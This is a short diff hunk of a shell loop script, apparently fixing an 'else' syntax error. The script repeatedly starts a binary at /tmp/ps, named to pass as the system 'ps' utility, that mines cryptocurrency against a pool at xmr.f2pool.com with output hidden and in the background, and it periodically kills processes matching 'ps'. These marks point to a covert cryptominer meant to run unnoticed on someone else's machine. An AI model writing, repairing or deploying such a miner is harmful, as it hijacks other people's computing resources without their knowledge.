@@ -6,7 +6,7 @@ while [  $COUNTER -lt 100 ]; do
 		sleep 1200s
 	    pkill -f ps
 	    let COUNTER = 0
-	else;
+	else
 		/tmp/ps --pool xmr.f2pool.com:13531 --username $user.$top --password x --algorithm wrkzcoin >/dev/null &
 	    sleep 20s
 	    let COUNTER = COUNTER+1
